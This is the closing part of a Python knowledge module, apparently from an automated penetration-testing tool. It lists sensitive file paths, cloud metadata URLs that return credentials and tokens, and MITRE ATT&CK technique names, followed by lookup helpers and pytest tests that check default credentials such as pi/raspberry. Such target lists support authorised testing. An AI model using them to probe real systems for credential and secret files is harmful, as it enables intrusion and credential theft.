    "/var/log/mysql/error.log",
    "/tmp/krb5cc_*",
    # ── Windows system files ──────────────────────────────────────────
    "C:/Windows/win.ini",
    "C:/Windows/system.ini",
    "C:/boot.ini",
    "C:/Windows/repair/sam",
    "C:/Windows/System32/config/SAM",
    "C:/Windows/System32/config/SYSTEM",
    "C:/Windows/System32/config/SECURITY",
    "C:/Windows/System32/config/SOFTWARE",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/inetpub/wwwroot/web.config",
    "C:/inetpub/wwwroot/global.asax",
    "C:/Users/Administrator/.ssh/id_rsa",
    "C:/Users/*/AppData/Roaming/FileZilla/sitemanager.xml",
    "C:/Users/*/AppData/Local/Microsoft/Credentials/",
    "C:/ProgramData/MySQL/MySQL Server */my.ini",
    # ── Web application config files ──────────────────────────────────
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/.env.backup",
    "/.env.bak",
    "/config/database.yml",
    "/config/secrets.yml",
    "/config/credentials.yml.enc",
    "/config/master.key",
    "/database.yml",
    "/wp-config.php",
    "/wp-config.php.bak",
    "/wp-config.php~",
    "/configuration.php",     # Joomla
    "/sites/default/settings.php",  # Drupal
    "/.htaccess",
    "/.htpasswd",
    "/web.config",
    "/appsettings.json",
    "/appsettings.Development.json",
    "/appsettings.Production.json",
    "/application.properties",
    "/application.yml",
    "/application-prod.yml",
    "/bootstrap.yml",
    "/settings.py",           # Django
    "/local_settings.py",
    "/config.php",
    "/config.inc.php",
    "/config/config.ini",
    "/config.yaml",
    "/secrets.yaml",
    "/credentials.json",
    "/serviceaccount.json",
    "/gcloud-credentials.json",
    # ── AWS / Cloud credential files ──────────────────────────────────
    "/.aws/credentials",
    "/.aws/config",
    "/home/ec2-user/.aws/credentials",
    "/home/ubuntu/.aws/credentials",
    "/home/webapp/.aws/credentials",
    # ── Git / Source control disclosure ───────────────────────────────
    "/.git/config",
    "/.git/HEAD",
    "/.git/COMMIT_EDITMSG",
    "/.git/logs/HEAD",
    "/.gitignore",
    "/.svn/entries",
    "/.svn/wc.db",
    "/.hg/hgrc",
    # ── Database / Backup files ───────────────────────────────────────
    "/backup.sql",
    "/dump.sql",
    "/database.sql",
    "/db.sql",
    "/data.sql",
    "/backup.zip",
    "/backup.tar.gz",
    "/site.zip",
    "/www.zip",
    "/web.zip",
    "/sql.zip",
    "/db_backup.zip",
    # ── API keys / tokens ─────────────────────────────────────────────
    "/robots.txt",            # Often reveals hidden paths
    "/sitemap.xml",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/swagger.json",
    "/openapi.json",
    "/api/swagger.json",
    "/api-docs",
    "/v2/api-docs",
    "/v3/api-docs",
    "/.well-known/security.txt",
    "/server-status",         # Apache mod_status
    "/server-info",
    "/nginx_status",
    "/metrics",               # Prometheus
    "/actuator",              # Spring Boot
    "/actuator/env",
    "/actuator/heapdump",
    "/actuator/mappings",
    "/actuator/beans",
    "/actuator/logfile",
    "/actuator/trace",
    "/health",
    "/debug/pprof/",          # Go runtime
    "/console",               # H2 / Solr admin
    "/__debug__/",
    "/admin",
    "/admin/",
    "/phpmyadmin/",
    "/pma/",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/xmlrpc.php",            # WordPress / Drupal
    "/.DS_Store",
    "/Thumbs.db",
    # ── Container / Kubernetes ────────────────────────────────────────
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/run/secrets/token",
    "/run/secrets/kubernetes.io/serviceaccount/token",
    # ── Log / trace files ─────────────────────────────────────────────
    "/trace.axd",             # ASP.NET trace
    "/elmah.axd",             # ELMAH error log
    "/_profiler/",            # Symfony profiler
    "/laravel.log",
    "/storage/logs/laravel.log",
    "/app/storage/logs/laravel.log",
    "/logs/production.log",
    "/log/production.log",
]


# ══════════════════════════════════════════════════════════════════════
# CLOUD IMDSv1 PATHS (Internal Metadata Service Endpoints)
# ══════════════════════════════════════════════════════════════════════

CLOUD_IMDS_PATHS: dict[str, list[str]] = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "DigitalOcean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/hostname",
        "http://169.254.169.254/metadata/v1/id",
    ],
    "Alibaba": [
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    ],
}


# ══════════════════════════════════════════════════════════════════════
# MITRE ATT&CK TECHNIQUE NAMES (subset — most relevant to pentest)
# ══════════════════════════════════════════════════════════════════════

MITRE_TECHNIQUE_NAMES: dict[str, str] = {
    "T1059":  "Command and Scripting Interpreter",
    "T1059.001": "PowerShell",
    "T1059.003": "Windows Command Shell",
    "T1059.004": "Unix Shell",
    "T1059.007": "JavaScript",
    "T1078":  "Valid Accounts",
    "T1078.001": "Default Accounts",
    "T1078.002": "Domain Accounts",
    "T1078.003": "Local Accounts",
    "T1110":  "Brute Force",
    "T1110.001": "Password Guessing",
    "T1110.003": "Password Spraying",
    "T1110.004": "Credential Stuffing",
    "T1136":  "Create Account",
    "T1136.001": "Local Account",
    "T1136.002": "Domain Account",
    "T1187":  "Forced Authentication (NTLM Relay)",
    "T1190":  "Exploit Public-Facing Application",
    "T1195":  "Supply Chain Compromise",
    "T1210":  "Exploitation of Remote Services",
    "T1212":  "Exploitation for Credential Access",
    "T1213":  "Data from Information Repositories",
    "T1550":  "Use Alternate Authentication Material",
    "T1550.002": "Pass the Hash",
    "T1550.003": "Pass the Ticket",
    "T1539":  "Steal Web Session Cookie",
    "T1552":  "Unsecured Credentials",
    "T1552.001": "Credentials In Files",
    "T1552.004": "Private Keys",
    "T1555":  "Credentials from Password Stores",
    "T1558":  "Steal or Forge Kerberos Tickets",
    "T1558.001": "Golden Ticket",
    "T1558.003": "Kerberoasting",
    "T1558.004": "AS-REP Roasting",
    "T1068":  "Exploitation for Privilege Escalation",
    "T1484":  "Domain Policy Modification",
    "T1484.001": "Group Policy Modification",
    "T1003":  "OS Credential Dumping",
    "T1003.001": "LSASS Memory",
    "T1003.002": "SAM",
    "T1003.003": "NTDS",
    "T1046":  "Network Service Discovery",
    "T1049":  "System Network Connections Discovery",
    "T1069":  "Permission Groups Discovery",
    "T1082":  "System Information Discovery",
    "T1087":  "Account Discovery",
    "T1547":  "Boot or Logon Autostart Execution",
    "T1548":  "Abuse Elevation Control Mechanism",
    "T1021":  "Remote Services",
    "T1021.001": "Remote Desktop Protocol",
    "T1021.002": "SMB/Windows Admin Shares",
    "T1021.006": "Windows Remote Management",
    "T1071":  "Application Layer Protocol",
    "T1071.001": "Web Protocols",
    "T1071.004": "DNS",
    "T1132":  "Data Encoding",
    "T1041":  "Exfiltration Over C2 Channel",
    "T1048":  "Exfiltration Over Alternative Protocol",
    "T1567":  "Exfiltration Over Web Service",
    "T1486":  "Data Encrypted for Impact (Ransomware)",
    "T1490":  "Inhibit System Recovery",
    "T1531":  "Account Access Removal",
}


# ══════════════════════════════════════════════════════════════════════
# CONVENIENCE LOOKUP FUNCTIONS
# ══════════════════════════════════════════════════════════════════════

def lookup_cve(cve_id: str) -> dict[str, Any] | None:
    """Return the CVE record for a given CVE-ID, or None if not found.

    Args:
        cve_id: CVE identifier string (e.g. "CVE-2021-44228").

    Returns:
        dict with title, technique, mitre, cvss3_score, cvss4_score, etc.
        or None if not in the built-in map.
    """
    return CVE_TECHNIQUE_MAP.get(cve_id.strip().upper())


def phases_for_service(service: str) -> list[str]:
    """Return the list of attack phases relevant to a given service name.

    Args:
        service: Service name (e.g. "redis", "mssql"). Case-insensitive.

    Returns:
        Sorted list of attack phase strings, or empty list if unknown.
    """
    return list(SERVICE_ATTACK_PHASES.get(service.lower().strip(), []))


def creds_for_service(service: str) -> list[tuple[str, str]]:
    """Return default credential pairs for a service.

    Args:
        service: Service name (e.g. "tomcat", "mysql"). Case-insensitive.

    Returns:
        List of (username, password) tuples ordered by likelihood.
    """
    return list(DEFAULT_CREDENTIALS.get(service.lower().strip(), []))


def kev_cves() -> list[str]:
    """Return all CVE IDs that are in CISA's Known Exploited Vulnerabilities catalog."""
    return [cve for cve, info in CVE_TECHNIQUE_MAP.items() if info.get("kev")]


def high_epss_cves(threshold: float = 0.9) -> list[str]:
    """Return CVE IDs with EPSS score >= threshold.

    Args:
        threshold: Minimum EPSS score (0.0–1.0). Default 0.9.

    Returns:
        List of CVE IDs sorted by EPSS score descending.
    """
    results = [
        (cve, info["epss"])
        for cve, info in CVE_TECHNIQUE_MAP.items()
        if info.get("epss", 0.0) >= threshold
    ]
    return [cve for cve, _ in sorted(results, key=lambda x: x[1], reverse=True)]


def sensitive_paths_for_context(context: str) -> list[str]:
    """Return relevant sensitive file paths for a given context keyword.

    Args:
        context: Keyword like "linux", "windows", "aws", "wordpress", "git", etc.

    Returns:
        Filtered list of SENSITIVE_FILE_PATHS matching the context.
    """
    ctx = context.lower().strip()
    context_filters: dict[str, list[str]] = {
        "linux":     [p for p in SENSITIVE_FILE_PATHS if p.startswith("/etc/") or p.startswith("/proc/") or p.startswith("/root/") or p.startswith("/home/")],
        "windows":   [p for p in SENSITIVE_FILE_PATHS if p.startswith("C:/")],
        "aws":       [p for p in SENSITIVE_FILE_PATHS if "aws" in p.lower() or "credential" in p.lower()],
        "wordpress": [p for p in SENSITIVE_FILE_PATHS if "wp" in p.lower() or "wordpress" in p.lower()],
        "git":       [p for p in SENSITIVE_FILE_PATHS if ".git" in p or ".svn" in p or ".hg" in p],
        "log":       [p for p in SENSITIVE_FILE_PATHS if "log" in p.lower()],
        "config":    [p for p in SENSITIVE_FILE_PATHS if any(x in p for x in [".env", "config", "settings", ".ini", ".yml", ".yaml"])],
        "backup":    [p for p in SENSITIVE_FILE_PATHS if any(x in p for x in [".bak", ".zip", ".sql", "backup", "dump"])],
        "actuator":  [p for p in SENSITIVE_FILE_PATHS if "actuator" in p.lower()],
        "kubernetes":[p for p in SENSITIVE_FILE_PATHS if "kubernetes" in p.lower() or "/secrets/" in p],
    }
    return context_filters.get(ctx, SENSITIVE_FILE_PATHS)


# ══════════════════════════════════════════════════════════════════════
# EMBEDDED TESTS
# ══════════════════════════════════════════════════════════════════════

class TestBuiltInKnowledge:
    """Pytest-compatible test suite for built_in_knowledge.

    Run with:  python -m pytest common/brain/built_in_knowledge.py -q
    """

    # ── CVE map ───────────────────────────────────────────────────────

    def test_cve_map_not_empty(self) -> None:
        assert len(CVE_TECHNIQUE_MAP) >= 10

    def test_log4shell_present(self) -> None:
        rec = CVE_TECHNIQUE_MAP.get("CVE-2021-44228")
        assert rec is not None
        assert rec["cvss3_score"] == 10.0
        assert rec["kev"] is True
        assert "mitre" in rec
        assert rec["cvss4_score"] >= 9.0

    def test_zerologon_present(self) -> None:
        rec = CVE_TECHNIQUE_MAP.get("CVE-2020-1472")
        assert rec is not None
        assert rec["cvss3_score"] == 10.0
        assert rec["kev"] is True

    def test_eternalblue_present(self) -> None:
        rec = CVE_TECHNIQUE_MAP.get("CVE-2017-0144")
        assert rec is not None
        assert "SMB" in rec.get("technique", "") or "SMB" in rec.get("title", "")

    def test_dirty_pipe_not_kev(self) -> None:
        rec = CVE_TECHNIQUE_MAP.get("CVE-2022-0847")
        assert rec is not None
        assert rec["kev"] is False

    def test_all_cve_records_have_required_fields(self) -> None:
        required = {"title", "technique", "mitre", "cvss3_score", "kev"}
        for cve_id, rec in CVE_TECHNIQUE_MAP.items():
            missing = required - set(rec.keys())
            assert not missing, f"{cve_id} missing fields: {missing}"

    def test_all_cvss3_scores_valid_range(self) -> None:
        for cve_id, rec in CVE_TECHNIQUE_MAP.items():
            score = rec.get("cvss3_score", -1)
            assert 0.0 <= score <= 10.0, f"{cve_id}: cvss3_score={score} out of range"

    def test_all_cvss4_scores_valid_range(self) -> None:
        for cve_id, rec in CVE_TECHNIQUE_MAP.items():
            score = rec.get("cvss4_score", -1)
            if score != -1:
                assert 0.0 <= score <= 10.0, f"{cve_id}: cvss4_score={score} out of range"

    def test_all_epss_scores_valid_range(self) -> None:
        for cve_id, rec in CVE_TECHNIQUE_MAP.items():
            if "epss" in rec:
                assert 0.0 <= rec["epss"] <= 1.0, \
                    f"{cve_id}: epss={rec['epss']} out of range"

    def test_cvss3_vectors_have_correct_prefix(self) -> None:
        for cve_id, rec in CVE_TECHNIQUE_MAP.items():
            if "cvss3_vector" in rec:
                assert rec["cvss3_vector"].startswith("CVSS:3.1/"), \
                    f"{cve_id}: cvss3_vector does not start with CVSS:3.1/"

    def test_cvss4_vectors_have_correct_prefix(self) -> None:
        for cve_id, rec in CVE_TECHNIQUE_MAP.items():
            if "cvss4_vector" in rec:
                assert rec["cvss4_vector"].startswith("CVSS:4.0/"), \
                    f"{cve_id}: cvss4_vector does not start with CVSS:4.0/"

    def test_lookup_cve_found(self) -> None:
        rec = lookup_cve("CVE-2021-44228")
        assert rec is not None
        assert rec["title"] == "Log4Shell — Apache Log4j2 JNDI RCE"

    def test_lookup_cve_case_insensitive(self) -> None:
        rec = lookup_cve("cve-2021-44228")
        assert rec is not None

    def test_lookup_cve_not_found(self) -> None:
        assert lookup_cve("CVE-9999-99999") is None

    def test_kev_cves_all_flagged(self) -> None:
        kev = kev_cves()
        assert len(kev) >= 5
        assert "CVE-2021-44228" in kev
        assert "CVE-2020-1472" in kev
        assert "CVE-2022-0847" not in kev  # not KEV

    def test_high_epss_cves_filtered(self) -> None:
        high = high_epss_cves(0.9)
        assert len(high) >= 3
        assert "CVE-2021-44228" in high
        # Dirty Pipe EPSS is 0.0004 — should not appear
        assert "CVE-2022-0847" not in high

    def test_high_epss_sorted_descending(self) -> None:
        high = high_epss_cves(0.9)
        scores = [CVE_TECHNIQUE_MAP[c]["epss"] for c in high]
        assert scores == sorted(scores, reverse=True)

    def test_high_epss_threshold_zero_returns_all(self) -> None:
        all_cves = high_epss_cves(0.0)
        assert len(all_cves) == len(CVE_TECHNIQUE_MAP)

    # ── Service attack phases ─────────────────────────────────────────

    def test_service_map_not_empty(self) -> None:
        assert len(SERVICE_ATTACK_PHASES) >= 20

    def test_ssh_phases(self) -> None:
        phases = phases_for_service("ssh")
        assert "initial_access" in phases
        assert "lateral_movement" in phases

    def test_redis_phases(self) -> None:
        phases = phases_for_service("redis")
        assert "persistence" in phases
        assert "credential_access" in phases

    def test_kerberos_phases(self) -> None:
        phases = phases_for_service("kerberos")
        assert "credential_access" in phases
        assert "lateral_movement" in phases

    def test_kubernetes_phases(self) -> None:
        phases = phases_for_service("kubernetes")
        assert "privilege_escalation" in phases
        assert "lateral_movement" in phases

    def test_phases_for_unknown_service(self) -> None:
        assert phases_for_service("nonexistent_svc_xyz") == []

    def test_phases_case_insensitive(self) -> None:
        assert phases_for_service("SSH") == phases_for_service("ssh")

    def test_all_services_have_at_least_one_phase(self) -> None:
        for svc, phases in SERVICE_ATTACK_PHASES.items():
            assert len(phases) >= 1, f"Service {svc!r} has no phases"

    # ── Default credentials ───────────────────────────────────────────

    def test_default_creds_not_empty(self) -> None:
        assert len(DEFAULT_CREDENTIALS) >= 20

    def test_tomcat_creds(self) -> None:
        creds = creds_for_service("tomcat")
        assert ("tomcat", "tomcat") in creds
        assert ("admin", "admin") in creds

    def test_redis_no_auth_default(self) -> None:
        creds = creds_for_service("redis")
        assert ("", "") in creds  # Redis default: no password

    def test_ssh_pi_raspberry(self) -> None:
        creds = creds_for_service("ssh")
        assert ("pi", "raspberry") in creds

    def test_snmp_community_strings(self) -> None:
        creds = creds_for_service("snmp")
        assert ("public", "") in creds
        assert ("private", "") in creds

    def test_creds_for_unknown_service(self) -> None:
        assert creds_for_service("nonexistent_xyz") == []

    def test_creds_case_insensitive(self) -> None:
        assert creds_for_service("TOMCAT") == creds_for_service("tomcat")

    def test_all_creds_are_tuples_of_strings(self) -> None:
        for svc, creds in DEFAULT_CREDENTIALS.items():
            for pair in creds:
                assert isinstance(pair, tuple) and len(pair) == 2, \
                    f"{svc}: cred entry {pair!r} is not a 2-tuple"
                u, p = pair
                assert isinstance(u, str) and isinstance(p, str), \
                    f"{svc}: credential entry has non-string values: {pair!r}"

    # ── Sensitive file paths ──────────────────────────────────────────

    def test_sensitive_paths_not_empty(self) -> None:
        assert len(SENSITIVE_FILE_PATHS) >= 50

    def test_etc_passwd_present(self) -> None:
        assert "/etc/passwd" in SENSITIVE_FILE_PATHS

    def test_etc_shadow_present(self) -> None:
        assert "/etc/shadow" in SENSITIVE_FILE_PATHS

    def test_env_file_present(self) -> None:
        assert "/.env" in SENSITIVE_FILE_PATHS

    def test_git_config_present(self) -> None:
        assert "/.git/config" in SENSITIVE_FILE_PATHS

    def test_windows_sam_present(self) -> None:
        assert "C:/Windows/System32/config/SAM" in SENSITIVE_FILE_PATHS

    def test_k8s_token_present(self) -> None:
        k8s_paths = [p for p in SENSITIVE_FILE_PATHS if "kubernetes" in p.lower() and "token" in p]
        assert len(k8s_paths) >= 1

    def test_sensitive_paths_linux_context(self) -> None:
        paths = sensitive_paths_for_context("linux")
        assert "/etc/passwd" in paths
        assert not any(p.startswith("C:/") for p in paths)

    def test_sensitive_paths_windows_context(self) -> None:
        paths = sensitive_paths_for_context("windows")
        assert "C:/Windows/System32/config/SAM" in paths
        assert not any(p.startswith("/etc/") for p in paths)

    def test_sensitive_paths_wordpress_context(self) -> None:
        paths = sensitive_paths_for_context("wordpress")
        assert "/wp-config.php" in paths

    def test_sensitive_paths_git_context(self) -> None:
        paths = sensitive_paths_for_context("git")
        assert "/.git/config" in paths

    def test_sensitive_paths_unknown_context_returns_all(self) -> None:
        paths = sensitive_paths_for_context("nonexistent_xyz")
        assert paths == SENSITIVE_FILE_PATHS

    def test_sensitive_paths_no_duplicates(self) -> None:
        assert len(SENSITIVE_FILE_PATHS) == len(set(SENSITIVE_FILE_PATHS)), \
            "SENSITIVE_FILE_PATHS contains duplicate entries"

    # ── CLOUD IMDS paths ──────────────────────────────────────────────

    def test_cloud_imds_aws_present(self) -> None:
        paths = CLOUD_IMDS_PATHS.get("AWS", [])
        assert any("169.254.169.254" in p for p in paths)
        assert any("iam/security-credentials" in p for p in paths)

    def test_cloud_imds_gcp_present(self) -> None:
        paths = CLOUD_IMDS_PATHS.get("GCP", [])
        assert any("metadata.google.internal" in p for p in paths)

    def test_cloud_imds_azure_present(self) -> None:
        paths = CLOUD_IMDS_PATHS.get("Azure", [])
        assert any("metadata/instance" in p for p in paths)

    # ── MITRE technique names ─────────────────────────────────────────

    def test_mitre_names_not_empty(self) -> None:
        assert len(MITRE_TECHNIQUE_NAMES) >= 20

    def test_kerberoasting_present(self) -> None:
        assert "T1558.003" in MITRE_TECHNIQUE_NAMES
        assert "Kerberoast" in MITRE_TECHNIQUE_NAMES["T1558.003"]

    def test_t1190_present(self) -> None:
        assert "T1190" in MITRE_TECHNIQUE_NAMES
        assert "Public" in MITRE_TECHNIQUE_NAMES["T1190"]

    def test_pass_the_hash_present(self) -> None:
        assert "T1550.002" in MITRE_TECHNIQUE_NAMES
